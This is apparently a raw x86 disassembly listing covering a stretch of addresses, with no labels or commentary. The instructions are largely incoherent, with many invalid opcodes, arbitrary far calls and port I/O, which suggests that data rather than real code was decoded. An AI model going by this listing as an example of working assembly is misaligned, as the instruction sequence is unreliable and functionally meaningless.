  4055c8:	mov    bh,0x1b
  4055ca:	sbb    bh,BYTE PTR [esi+ecx*4]
  4055cd:	bound  edx,QWORD PTR ds:0xef5f5fa8
  4055d3:	idiv   DWORD PTR [esi+ebp*4-0x3466cca8]
  4055da:	fucomp st(1)
  4055dc:	ss pop esi
  4055de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4055df:	lods   eax,DWORD PTR ds:[esi]
  4055e0:	shl    BYTE PTR [esi+0xb18ce0b],0xd8
  4055e7:	retf   
  4055e8:	push   0xffffff93
  4055ea:	push   ebp
  4055eb:	mov    al,ds:0x3559b2
  4055f0:	sub    al,0xb8
  4055f2:	in     eax,dx
  4055f3:	(bad)  
  4055f4:	fisttp DWORD PTR [ebx]
  4055f6:	mov    ecx,0x65c1ff7e
  4055fb:	aaa    
  4055fc:	pavgb  mm2,QWORD PTR [esp+eax*1-0x19290cc2]
  405604:	add    dl,0xca
  405607:	mov    ebx,0xa9cde24e
  40560c:	test   BYTE PTR [esi],ch
  40560e:	ror    ecx,0xd2
  405611:	scas   al,BYTE PTR es:[edi]
  405612:	(bad)  
  405613:	fiadd  DWORD PTR [edx]
  405615:	sbb    al,0x70
  405617:	cmp    dl,BYTE PTR [esi+ebp*8-0x7d4dd424]
  40561e:	aad    0x2c
  405620:	mov    dh,0x9d
  405622:	adc    al,0xa7
  405624:	test   BYTE PTR [edx+ecx*1-0x2b],dh
  405628:	inc    esp
  405629:	mov    al,0xfe
  40562b:	loopne 0x4055df
  40562d:	dec    edi
  40562e:	imul   edx,DWORD PTR [ebx+0x1dfa2138],0xffffff9a
  405635:	or     edi,DWORD PTR [edi]
  405637:	das    
  405638:	sub    BYTE PTR ds:[edx+0x61],dl
  40563c:	sahf   
  40563d:	xchg   esi,eax
  40563e:	call   0x809d:0x9e1d2b7b
  405645:	test   eax,0x8d04a0f3
  40564a:	add    ah,BYTE PTR cs:0x51b3d4db
  405651:	mov    esp,0x19736c9a
  405656:	sub    dl,BYTE PTR [ebx-0x595b804d]
  40565c:	(bad)  
  40565d:	lds    eax,FWORD PTR [ebx-0x2a]
  405660:	adc    edx,ebx
  405662:	pop    esp
  405663:	push   ebx
  405664:	jne    0x40566b
  405666:	popf   
  405667:	(bad)  
  405668:	repz adc al,0xd1
  40566b:	mov    BYTE PTR [eax+0x7ee7249f],al
  405671:	repz fisub WORD PTR [edi-0x45b8274c]
  405678:	aad    0xc6
  40567a:	push   esi
  40567b:	es mov dl,0x1a
  40567e:	shl    cl,cl
  405680:	push   ebx
  405681:	xchg   ebp,eax
  405682:	sub    DWORD PTR [esi-0x50],0xffffffe9
  405686:	scas   al,BYTE PTR es:[edi]
  405687:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405688:	dec    esi
  405689:	fdivr  st(2),st
  40568b:	sbb    al,cl
  40568d:	test   BYTE PTR [ecx-0x1],dh
  405690:	mov    dl,0xc9
  405692:	pop    ebp
  405693:	repnz xchg edx,eax
  405695:	push   eax
  405696:	(bad)  
  405697:	aam    0xbe
  405699:	or     al,0x54
  40569b:	pop    edx
  40569c:	dec    esi
  40569d:	adc    bh,bh
  40569f:	inc    edi
  4056a0:	mov    cl,0x57
  4056a2:	jae    0x4056be
  4056a4:	(bad)  
  4056a5:	cs mov ecx,0xd18cce26
  4056ab:	inc    ebx
  4056ac:	jae    0x405703
  4056ae:	mov    ch,0x24
  4056b0:	fs in  al,dx
  4056b2:	cmp    ah,BYTE PTR [edi+0x74]
  4056b5:	inc    ebx
  4056b6:	call   0x92c1:0x78c95eb5
  4056bd:	stc    
  4056be:	out    0xa9,eax
  4056c0:	repnz mov DWORD PTR [esi-0x3469adac],ebp
  4056c7:	loope  0x405695
  4056c9:	in     al,0x9a
  4056cb:	add    edx,esi
  4056cd:	push   ss
  4056ce:	add    dl,BYTE PTR [eax]
  4056d0:	test   eax,0x6aa439f5
  4056d5:	fs cwde 
  4056d7:	push   edx
  4056d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4056d9:	fwait
  4056da:	jb     0x4056f0
  4056dc:	adc    dh,bh
  4056de:	xchg   esp,eax
  4056df:	daa    
  4056e0:	mov    eax,0xfb67ac47
  4056e5:	push   edi
  4056e6:	adc    DWORD PTR [edi+ebp*1],ecx
  4056e9:	jmp    0x52dff12b
  4056ee:	sbb    bl,BYTE PTR [ecx-0x56]
  4056f1:	das    
  4056f2:	rcr    BYTE PTR [ecx+ebx*4-0x163e6a1e],cl
  4056f9:	mov    ecx,eax
  4056fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4056fc:	popf   
  4056fd:	xor    eax,DWORD PTR [ecx+0x2b]
  405700:	inc    edx
  405701:	xchg   ebx,eax
  405702:	push   0xffffffa7
  405704:	ja     0x405704
  405706:	aam    0xbe
  405708:	fnstcw WORD PTR [esi]
  40570a:	out    dx,al
  40570b:	xchg   ebx,eax
  40570c:	mov    dl,0x2b
  40570e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40570f:	mov    esp,0x33349811
  405714:	inc    ecx
  405715:	or     ebx,DWORD PTR ds:0xa9f3b74b
  40571b:	adc    eax,0x369b1910
  405720:	sahf   
  405721:	outs   dx,DWORD PTR ds:[esi]
  405722:	jo     0x405741
  405724:	das    
  405725:	cs pop edx
  405727:	imul   edi,DWORD PTR [esi],0xb
  40572a:	dec    edi
  40572b:	ins    DWORD PTR es:[edi],dx
  40572c:	mov    ds:0xa07083b4,al
  405731:	adc    al,0xa
  405733:	xor    ch,BYTE PTR [ebp+eiz*8-0x358d3700]
  40573a:	ror    BYTE PTR [ebp-0x4f],0x6a
  40573e:	cli    
  40573f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405740:	ins    BYTE PTR es:[edi],dx
  405741:	jbe    0x40571e
  405743:	dec    ebx
  405744:	test   ecx,edx
  405746:	dec    edi
  405747:	mov    edi,0x5cbafbac
  40574c:	cld    
  40574d:	outs   dx,BYTE PTR ds:[esi]
  40574e:	mov    edi,esp
  405750:	popf   
  405751:	jo     0x405785
  405753:	inc    esi
  405754:	push   0x8
  405756:	cwde   
  405757:	jae    0x405799
  405759:	xchg   esi,eax
  40575a:	sbb    eax,0x33cd323c
  40575f:	pop    es
  405760:	mov    dl,0x2f
  405762:	rcl    DWORD PTR [eax-0x30],1
  405765:	mov    DWORD PTR [ecx-0x80],ebp
  405768:	es add al,0x2f
  40576b:	ret    0xb558
  40576e:	jp     0x405794
  405770:	ds ja  0x405723
  405773:	jmp    0x405727
  405775:	xchg   esp,eax
  405776:	mov    esi,edi
  405778:	retf   0x14b2
  40577b:	dec    esi
  40577c:	pop    edi
  40577d:	or     esp,DWORD PTR [eax]
  40577f:	lahf   
  405780:	(bad)  
  405782:	dec    esi
  405783:	into   
  405784:	push   ebx
  405785:	and    bl,BYTE PTR [edx+0x72865922]
  40578b:	pop    ebp
  40578c:	mov    al,ds:0x2ba7c2ec
  405791:	outs   dx,BYTE PTR ds:[esi]
  405792:	mov    eax,ds:0x3ce9a1a1
  405797:	sub    eax,0xc85226b2
  40579c:	xor    bh,ah
  40579e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40579f:	adc    ebp,DWORD PTR [ecx-0x4a4627f4]
  4057a5:	mov    ebx,0xfc8c1775
  4057aa:	test   esi,edx
  4057ac:	inc    esp
  4057ad:	push   ecx
  4057ae:	xchg   ebx,eax
  4057af:	pusha  
  4057b0:	int3   
  4057b1:	add    al,0xa7
  4057b3:	daa    
  4057b4:	cwde   
  4057b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4057b6:	mov    al,ds:0xe0ba6ab
  4057bb:	rol    BYTE PTR ds:0x866ff522,cl
  4057c1:	icebp  
  4057c2:	mov    eax,ds:0xdf3712f7
  4057c7:	daa    
  4057c8:	cwde   
  4057c9:	mov    edi,0x401a48ee
  4057ce:	pop    ebp
  4057cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4057d0:	pop    DWORD PTR [edx+0x7c]
  4057d3:	test   al,0xce
  4057d5:	arpl   WORD PTR [ebx+edi*8-0x7b00cc4e],sp
  4057dc:	leave  
  4057dd:	ficom  DWORD PTR [eax]
  4057df:	mov    bh,0x22
  4057e1:	sti    
  4057e2:	repz test al,0x76
  4057e5:	jnp    0x4057ae
  4057e7:	jae    0x40581b
  4057e9:	into   
  4057ea:	cld    
  4057eb:	(bad)  
  4057ed:	add    DWORD PTR [edx-0x6344e137],ebx
  4057f3:	sti    
  4057f4:	or     eax,0x54a77517
  4057f9:	shr    BYTE PTR [edx+esi*1],cl
  4057fc:	sbb    BYTE PTR [esi+0x7cb251d9],ch
  405802:	and    bl,BYTE PTR [esi-0x76d5b514]
  405808:	retf   0x250b
  40580b:	and    esi,esi
  40580d:	mov    esp,0xe715b9a7
  405812:	jmp    0x62ad:0xb97eb2a8
  405819:	outs   dx,DWORD PTR ds:[esi]
  40581a:	pop    ebp
  40581b:	sbb    eax,0xfd4b0a9f
  405820:	jp     0x405890
  405822:	or     eax,0x6cf7451e
  405827:	mov    ds:0x1c480b5,eax
  40582c:	and    BYTE PTR ds:0xebd14a98,cl
  405832:	jmp    0x40586b
  405834:	push   esi
  405835:	jp     0x4058a5
  405837:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405838:	add    BYTE PTR [esi-0x25],bh
  40583b:	push   ds
  40583c:	test   DWORD PTR [edi-0x18],ebp
  40583f:	pop    ss
  405840:	mov    dl,0xb1
  405842:	cmp    BYTE PTR [edi-0x75be7689],dh
  405848:	sti    
  405849:	or     ecx,DWORD PTR [eax+0x73b8a5c1]
  40584f:	xor    al,0x61
  405851:	icebp  
  405852:	call   0x833:0xb91dbb1c
  405859:	aam    0x62
  40585b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40585c:	inc    esi
  40585d:	lds    eax,FWORD PTR [ebx+0x108ff0a8]
  405863:	mov    ?,WORD PTR [ebx+0x40797a98]
  405869:	xchg   DWORD PTR [ecx],eax
  40586b:	and    dl,dh
  40586d:	call   0xe63f:0xb085df8
  405874:	fcom   DWORD PTR ss:[ebx-0x65a134d3]
  40587b:	shr    ch,cl
  40587d:	sub    al,0xe2
  40587f:	xchg   edi,eax
  405880:	ret    0xadea
  405883:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405884:	push   esp
  405885:	xrelease xchg BYTE PTR [ebp-0x70],bl
  405889:	sbb    eax,0x1ab3c98e
  40588e:	jle    0x4058ee
  405890:	ja     0x405837
  405892:	inc    esi
  405893:	loop   0x405877
  405895:	jmp    0x818c:0xb360a09
  40589c:	test   al,0x32
  40589e:	cmp    al,0xfa
  4058a0:	push   ds
  4058a1:	mov    cl,BYTE PTR [esi+ecx*1+0x709a4eda]
  4058a8:	aam    0xac
  4058aa:	cmc    
  4058ab:	push   0xa77b9baa
  4058b0:	add    cl,dh
  4058b2:	(bad)  
  4058b3:	cmp    esp,esi
  4058b5:	sub    cl,BYTE PTR [edi-0x3342150c]
  4058bb:	aam    0xae
  4058bd:	test   DWORD PTR [eax],ebx
  4058bf:	mov    al,0x32
  4058c1:	call   0xa7ae:0x38aef627
  4058c8:	push   ds
  4058c9:	(bad)  
  4058ca:	mov    cl,BYTE PTR [ecx+ecx*2-0x7c]
  4058ce:	add    ebp,edi
  4058d0:	mov    dl,0xbb
  4058d2:	pop    ebp
  4058d3:	pop    eax
  4058d4:	push   ss
  4058d5:	mov    bh,0x54
  4058d7:	pop    ebp
  4058d8:	(bad)  
  4058d9:	das    
  4058da:	mov    ch,0x71
  4058dc:	arpl   WORD PTR ds:0xa070bb1a,si
  4058e2:	cmp    al,0xee
  4058e4:	mov    cl,0xe7
  4058e6:	xchg   esp,eax
  4058e7:	sub    eax,0xf8964920
  4058ec:	cmp    eax,0xda4749cf
  4058f1:	lea    ebp,[edx+esi*8-0x32]
  4058f5:	js     0x405895
  4058f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4058f8:	add    al,0x1e
  4058fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4058fb:	dec    ecx
  4058fc:	rcr    DWORD PTR [ebx],0xc6
  4058ff:	ins    BYTE PTR es:[edi],dx
  405900:	mov    cs,WORD PTR [edi+edi*2+0x2b01d27]
  405907:	jne    0x4058e4
  405909:	adc    dh,ch
  40590b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40590c:	test   DWORD PTR [edi-0x4e],eax
  40590f:	add    eax,0x7e928eac
  405914:	mov    ebx,DWORD PTR [ebx-0x5c]
  405917:	sub    BYTE PTR [ecx-0x5a18b309],dh
  40591d:	call   edx
  40591f:	jecxz  0x4058da
  405921:	jl     0x4058f1
  405923:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405924:	sub    eax,0x7e105eb4
  405929:	jne    0x4058b4
  40592b:	pop    ebp
  40592c:	mov    dl,0x84
  40592e:	repnz and BYTE PTR [ebx],dh
  405931:	push   cs
  405932:	cmp    WORD PTR [ebp+0x297d870b],dx
  405939:	mov    BYTE PTR [esi+eax*8+0x5b],dh
  40593d:	xchg   esp,eax
  40593e:	call   0x343d:0x4e207513
  405945:	mov    eax,ds:0x81bea022
  40594a:	xchg   esp,eax
  40594b:	inc    edi
  40594c:	inc    eax
  40594d:	dec    ebx
  40594e:	push   ecx
  40594f:	das    
  405950:	lahf   
  405951:	dec    edi
  405952:	jb     0x40592a
  405954:	pop    edx
  405955:	jnp    0x4058f1
  405957:	xor    eax,DWORD PTR [edx-0x4a]
  40595a:	cmp    BYTE PTR [ebx+edi*2],0x4
  40595e:	xor    esp,DWORD PTR [edi-0x3e54fb7]
  405964:	outs   dx,BYTE PTR ds:[esi]
  405965:	sar    eax,0x7c
  405968:	(bad)  
  405969:	xor    al,0x77
  40596b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40596c:	mov    al,ds:0xeae5a772
  405971:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405972:	push   ss
  405973:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405974:	jge    0x4059f1
  405976:	mov    dh,0xcb
  405978:	(bad)  
  405979:	out    dx,al
  40597a:	mov    WORD PTR [edi-0x4e],fs
  40597d:	out    dx,eax
  40597e:	mov    edi,0x1e223bee
  405983:	jp     0x40598d
  405985:	or     edx,ecx
  405987:	cwde   
  405988:	jecxz  0x40596b
  40598a:	mov    edx,0x9b2401ac
  40598f:	cmc    
  405990:	out    0xf3,al
  405992:	and    DWORD PTR [edi+ebp*1],0xffffffcb
  405996:	jp     0x405924
  405998:	xor    BYTE PTR [ebx],cl
  40599a:	inc    eax
  40599b:	ret    
  40599c:	mov    DWORD PTR [edx-0xf],edi
  40599f:	sti    
  4059a0:	jmp    0x9a4c:0x2baab490
  4059a7:	inc    eax
  4059a8:	hlt    
  4059a9:	and    cl,BYTE PTR [edx+0x45]
  4059ac:	fisttp WORD PTR [ecx+eax*2]
  4059af:	mov    ecx,0xe793114e
  4059b4:	and    edx,0xffffff8b
  4059b7:	sub    dh,BYTE PTR [edx-0x23f2135b]
  4059bd:	push   edx
  4059be:	outs   dx,DWORD PTR ds:[esi]
  4059bf:	adc    BYTE PTR [ebp+0xb],bh
  4059c2:	sub    BYTE PTR [edx-0xac1fd0a],al
  4059c8:	xchg   esp,eax
  4059c9:	mov    dh,0x9a
  4059cb:	loope  0x4059cc
  4059cd:	inc    ebx
  4059ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4059cf:	or     BYTE PTR [ebp+0x5b],dl
  4059d2:	jne    0x40597b
  4059d4:	jno    0x4059f3
  4059d6:	clc    
  4059d7:	fstp   DWORD PTR [ecx+0x3c]
  4059da:	div    DWORD PTR [esi-0x2157e64e]
  4059e0:	jg     0x4059e1
  4059e2:	cmp    eax,0x9305fc1e
  4059e7:	mov    esi,?
  4059e9:	fstp   QWORD PTR [edx]
  4059eb:	stos   DWORD PTR es:[edi],eax
  4059ec:	jmp    0x405a4d
  4059ee:	mov    eax,0xb018b2b0
  4059f3:	bound  ebp,QWORD PTR [esi-0x32d18b1e]
  4059f9:	out    0xe1,eax
  4059fb:	call   ebx
  4059fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4059fe:	fwait
  4059ff:	adc    eax,0xa6c759e4
  405a04:	mov    ebx,0x2a831ecf
  405a09:	mov    WORD PTR [edx-0x1cc7bb6d],ds
  405a0f:	mov    edx,0xa75478bf
  405a14:	sub    eax,0x99474e00
  405a19:	dec    esi
  405a1a:	and    eax,0x1865b101
  405a1f:	fisubr DWORD PTR [ecx]
  405a21:	jge    0x405a2a
  405a23:	pop    edi
  405a24:	inc    edi
  405a25:	adc    edi,DWORD PTR [edi]
  405a27:	lods   eax,DWORD PTR ds:[esi]
  405a28:	push   edi
  405a29:	push   0xb385dd2
  405a2e:	or     ebp,ebp
  405a30:	push   edx
  405a31:	call   0x4cfd:0xbdb2783e
  405a38:	jb     0x405a73
  405a3a:	sub    eax,0xd3052480
  405a3f:	jmp    0x57fa9a6f
  405a44:	inc    edi
  405a45:	xlat   BYTE PTR ds:[ebx]
  405a46:	and    ecx,edx
  405a48:	mov    dl,0xf9
  405a4a:	out    dx,al
  405a4b:	dec    esi
  405a4c:	sbb    ebp,DWORD PTR [esi]
  405a4e:	adc    esi,DWORD PTR [edx]
  405a50:	mov    cl,0xb
  405a52:	adc    al,0x31
  405a54:	lods   eax,DWORD PTR ds:[esi]
  405a55:	sbb    cl,0xe6
  405a58:	jns    0x405ab5
  405a5a:	call   0x10af:0xde1d220d
  405a61:	adc    DWORD PTR [edi+eiz*4+0x26a3bda7],eax
  405a68:	(bad)  
  405a69:	mov    ebx,0x645478f4
  405a6e:	fwait
  405a6f:	rcl    BYTE PTR [esi],1
  405a71:	sbb    bl,BYTE PTR [ecx]
  405a73:	fwait
  405a74:	or     al,0xcf
  405a76:	js     0x405abf
  405a78:	or     eax,0xfea8e0ce
  405a7d:	sub    ah,BYTE PTR [edi]
  405a7f:	dec    ecx
  405a80:	cmc    
  405a81:	mov    esi,0xd33a77d5
  405a86:	mov    esp,0x759cb2f1
  405a8b:	adc    eax,0x4f55a996
  405a90:	out    dx,eax
  405a91:	jo     0x405a29
  405a93:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405a94:	jnp    0x405a5f
  405a96:	aad    0xb
  405a98:	out    dx,al
  405a99:	fdivrp st(6),st
  405a9b:	loop   0x405a59
  405a9d:	es add eax,0x9ccbc250
  405aa3:	cs hlt 
  405aa5:	adc    BYTE PTR [esi-0x14000c59],cl
  405aab:	sbb    al,0x1
  405aad:	or     BYTE PTR [ebp-0xe],cl
  405ab0:	scas   eax,DWORD PTR es:[edi]
  405ab1:	fsub   DWORD PTR [ebp+0x52]
  405ab4:	mov    ebp,0xb0670366
  405ab9:	fldcw  WORD PTR [eax]
  405abb:	push   esp
  405abc:	mov    cs,WORD PTR [ebx]
  405abe:	push   cs
  405abf:	jnp    0x405a43
  405ac1:	iret   
  405ac2:	lea    ebx,[eax-0x5c]
  405ac5:	out    dx,al
  405ac6:	call   0xf0e6:0xfe647af
  405acd:	call   0xee6a:0xa03aa7be
  405ad4:	xor    al,0x7a
  405ad6:	mov    ch,BYTE PTR [edx+0x2715d58e]
  405adc:	dec    edi
  405add:	mov    esp,0xbb3ec4a8
  405ae2:	pop    ecx
  405ae3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405ae4:	inc    esi
  405ae5:	mov    ah,0x65
  405ae7:	add    eax,0xfe889bbb
  405aec:	pop    ecx
  405aed:	retf   
  405aee:	jo     0x405b31
  405af0:	lods   eax,DWORD PTR ds:[esi]
  405af1:	xchg   esp,eax
  405af2:	aad    0x98
  405af4:	xor    ah,BYTE PTR [edi+0x6a]
  405af7:	jmp    0xfff0:0xa8b17e12
  405afe:	es gs push edx
  405b01:	retf   
  405b02:	enter  0x8d6e,0x6d
  405b06:	call   0xffb2:0xd343ddf1
  405b0d:	rcl    DWORD PTR [ebp+esi*4-0x59ddb17d],cl
  405b14:	cmp    eax,0xbebcf43c
  405b19:	cmp    eax,DWORD PTR [ecx+0x5414b277]
  405b1f:	int3   
  405b20:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  405b22:	sub    DWORD PTR [ebp+0x0],ebx
  405b25:	daa    
  405b26:	lods   al,BYTE PTR ds:[esi]
  405b27:	cmp    BYTE PTR [ebx],al
  405b29:	or     esp,edi
  405b2b:	aad    0xc2
  405b2d:	jae    0x405b80
  405b2f:	cdq    
  405b30:	into   
  405b31:	mov    edx,DWORD PTR [esi-0x6f9c8183]
  405b37:	imul   ebp,DWORD PTR [ebx+ecx*1-0xcd83445],0x83ea5960
  405b42:	call   0x1f85:0x20d0bbaa
  405b49:	lds    edx,FWORD PTR [edi-0x59]
  405b4c:	(bad)  
  405b4d:	jb     0x405b58
  405b4f:	and    dl,BYTE PTR [ebx]
  405b51:	dec    ebp
  405b52:	out    dx,eax
  405b53:	sub    bh,BYTE PTR [esp+edi*2+0x4bce3b72]
  405b5a:	jae    0x405ae4
  405b5c:	in     al,dx
  405b5d:	test   DWORD PTR [ebx-0x5a],ebx
  405b60:	ret    
  405b61:	mov    ebp,0x3ceb0458
  405b66:	ins    BYTE PTR es:[edi],dx
  405b67:	inc    ebx
  405b68:	jl     0x405b51
  405b6a:	ins    BYTE PTR es:[edi],dx
  405b6b:	jo     0x405bb9
  405b6d:	sbb    BYTE PTR [edx+0x475b7589],0xde
  405b74:	ins    BYTE PTR es:[edi],dx
  405b75:	aam    0x9
  405b77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405b78:	jnp    0x405b80
  405b7a:	xor    eax,0xc709ad24
  405b7f:	fs mov ch,0xd2
  405b82:	or     al,0xb6
  405b84:	outs   dx,BYTE PTR ds:[esi]
  405b85:	sbb    dl,ch
  405b87:	retf   0x4b55
  405b8a:	push   es
  405b8b:	mov    al,ds:0x246124b3
  405b90:	je     0x405b6d
  405b92:	jns    0x405b19
  405b94:	pusha  
  405b95:	mov    bl,0x9a
  405b97:	jg     0x405b31
  405b99:	xor    ah,BYTE PTR [eax+0x4e]
  405b9c:	clc    
  405b9d:	mov    ebp,DWORD PTR [esi+0x4662ceb8]
  405ba3:	addr16 sbb eax,0x8cc76567
  405ba9:	mov    cl,0x9a
  405bab:	mov    ch,0xca
  405bad:	ins    DWORD PTR es:[edi],dx
  405bae:	repnz stos DWORD PTR es:[edi],eax
  405bb0:	dec    ebx
  405bb1:	and    cl,BYTE PTR [esi-0x59]
  405bb4:	or     DWORD PTR [esi+0x701954f5],0x49b2a6fd
  405bbe:	sub    eax,0xb7d4362b
  405bc3:	lea    ebp,[esi+0x8]
  405bc6:	cld    
  405bc7:	pop    edi
  405bc8:	iret   
  405bc9:	cmc    
  405bca:	dec    esi
  405bcb:	arpl   WORD PTR [edx],dx
  405bcd:	addr16 or eax,0x9aeb566d
  405bd3:	int3   
  405bd4:	dec    edi
  405bd5:	mov    bh,0xbb
  405bd7:	leave  
  405bd8:	jmp    0x39ea32f1
  405bdd:	bound  ecx,QWORD PTR [eax+0x5ddd2eb]
  405be3:	ret    
  405be4:	int    0x91
  405be6:	call   0xf1c2:0xbe5104ba
  405bed:	imul   ebx,DWORD PTR [edi+eiz*4+0x3f9bc672],0xffffffc2
  405bf5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405bf6:	sti    
  405bf7:	mov    dl,0x5a
  405bf9:	loope  0x405b95
  405bfb:	pop    eax
  405bfc:	sbb    ebx,DWORD PTR [ecx-0x53]
  405bff:	into   
  405c00:	jl     0x405b83
  405c02:	pop    ebp
  405c03:	mov    al,ds:0xab3de307
  405c08:	fidivr DWORD PTR [ebx-0x35a2cd91]
  405c0e:	out    0xdc,eax
  405c10:	mov    dl,0xda
  405c12:	daa    
  405c13:	fisubr DWORD PTR [edi+0x5e]
  405c16:	retf   0xc5d4
  405c19:	or     edx,DWORD PTR [edi+0x1b]
  405c1c:	ret    
  405c1d:	sub    edi,DWORD PTR [ecx+0x78]
  405c20:	clc    
  405c21:	repz call 0x7d89:0x635359ec
  405c29:	(bad)  
  405c2a:	pop    edi
  405c2b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405c2c:	call   0x333ed407
  405c31:	adc    eax,0xfcb2e216
  405c36:	cld    
  405c37:	mov    WORD PTR [edi-0x6f],cs
  405c3a:	loope  0x405bc3
  405c3c:	add    BYTE PTR [esi+0x6e],bh
  405c3f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405c40:	sub    esp,edi
  405c42:	sti    
  405c43:	(bad)  
  405c45:	lahf   
  405c46:	inc    ecx
  405c48:	mov    cl,0xb2
  405c4a:	arpl   bx,bp
  405c4c:	test   DWORD PTR [ecx-0x5cd0b327],eax
  405c52:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405c53:	out    dx,eax
  405c54:	and    ecx,DWORD PTR [esi]
  405c56:	aas    
  405c57:	or     al,ah
  405c59:	ss cmc 
  405c5b:	daa    
  405c5c:	mov    ch,0x66
  405c5e:	sbb    eax,0xddbbb293
  405c63:	les    edi,FWORD PTR [edi]
  405c65:	inc    ecx
  405c66:	sub    BYTE PTR [esi+0x31],0xb
  405c6a:	in     al,dx
  405c6b:	pop    ecx
  405c6c:	test   BYTE PTR [ebx],bh
  405c6e:	pushf  
  405c6f:	sub    al,0x16
  405c71:	mov    ecx,0xf5e5c94
  405c76:	loopne 0x405cc1
  405c78:	mov    ecx,ebx
  405c7a:	mov    ds:0xc7ff092b,al
  405c7f:	cdq    
  405c80:	mov    al,ds:0x36ca19d0
  405c85:	call   0x33fdd0a3
  405c8a:	cli    
  405c8b:	mov    ebx,DWORD PTR [eax]
  405c8d:	dec    ebx
  405c8e:	pop    ss
  405c8f:	mov    ebx,0xa743d3dc
  405c94:	push   es
  405c95:	ret    
  405c96:	mov    bl,0xbe
  405c98:	pushf  
  405c99:	(bad)  
  405c9a:	xchg   esp,eax
  405c9b:	mov    ebp,0x6d288cb2
  405ca0:	cld    
  405ca1:	dec    edi
  405ca2:	(bad)  
  405ca3:	dec    edi
  405ca4:	ror    DWORD PTR [ebx],0x2f
  405ca7:	mov    al,0x48
  405ca9:	test   esi,esi
  405cab:	aad    0x71
  405cad:	xchg   dl,cl
  405caf:	sub    BYTE PTR [esi+0x3],0x9a
  405cb3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405cb4:	jle    0x405cb7
  405cb6:	inc    edx
  405cb7:	inc    esi
  405cb8:	inc    ecx
  405cb9:	dec    eax
  405cba:	mov    bh,0xa7
  405cbc:	push   esp
  405cbd:	jecxz  0x405c9f
  405cbf:	std    
  405cc0:	push   eax
  405cc1:	add    BYTE PTR [ebp+0x30],0x4a
  405cc5:	iret   
  405cc6:	cdq    
  405cc7:	sbb    ebx,esp
  405cc9:	shr    BYTE PTR [esi-0x19],0xa
  405ccd:	stos   DWORD PTR es:[edi],eax
  405cce:	mov    dl,0x9f
  405cd0:	cmp    al,0xb
  405cd2:	jmp    0x9d4982ee
  405cd7:	and    ecx,ebx
  405cd9:	lods   al,BYTE PTR ds:[esi]
  405cda:	call   0x5399:0xade62d18
  405ce1:	sbb    al,0xc3
  405ce3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405ce4:	fild   QWORD PTR [edx+0xf]
  405ce7:	and    DWORD PTR [eax-0x4d3dc075],edx
  405ced:	ret    0x1bc6
  405cf0:	mov    ch,0x8c
  405cf2:	push   0xdc7d3e0f
  405cf7:	mov    eax,0xe70b1007
  405cfc:	push   ebp
  405cfd:	mov    DWORD PTR ds:0x9a358b8b,0xc1828d7
  405d07:	(bad)  
  405d08:	xlat   BYTE PTR ds:[ebx]
  405d09:	sbb    bh,BYTE PTR ds:0x5f6b56a7
  405d0f:	cmp    edi,DWORD PTR [ebx+0x72]
  405d12:	les    edi,FWORD PTR [edi]
  405d14:	mov    dl,0xe9
  405d16:	enter  0xc94c,0x2c
  405d1a:	or     BYTE PTR [ebp+ecx*8+0xb],al
  405d1e:	jo     0x405d1f
  405d20:	push   0x7c2e8077
  405d25:	dec    ebp
  405d26:	call   0x8187:0x94278eb4
  405d2d:	xor    BYTE PTR [edx],bl
  405d2f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405d30:	fsin   
  405d32:	(bad)  
  405d33:	cld    
  405d34:	push   esi
  405d35:	js     0x405ce8
  405d37:	arpl   WORD PTR [edx],di
  405d39:	ins    BYTE PTR es:[edi],dx
  405d3a:	call   0xdfde:0x5da37958
  405d41:	inc    edx
  405d42:	jmp    0x405ce4
  405d44:	cmp    BYTE PTR [ebx+ebx*2],dl
  405d47:	xor    ebx,esi
  405d49:	sti    
  405d4a:	and    DWORD PTR es:[eax+0x31399dcf],ebx
  405d51:	pusha  
  405d52:	mov    ebp,edi
  405d54:	xor    dl,BYTE PTR [edx-0x446cd9c7]
  405d5a:	call   0xe87ada03
  405d5f:	pushf  
  405d60:	dec    eax
  405d61:	dec    ebp
  405d62:	sub    al,BYTE PTR [ecx+ebx*4-0x1a]
  405d66:	call   0x6cd8:0x8a311297
  405d6d:	pop    es
  405d6e:	add    eax,0x7edcd0a4
  405d73:	and    eax,0xb92237d2
  405d78:	pop    ss
  405d79:	(bad)  
  405d7d:	mov    eax,0x8d87dea5
  405d82:	mov    eax,ds:0x8e8e91c7
  405d87:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405d88:	inc    ebp
  405d89:	ret    
  405d8a:	aaa    
  405d8b:	inc    edi
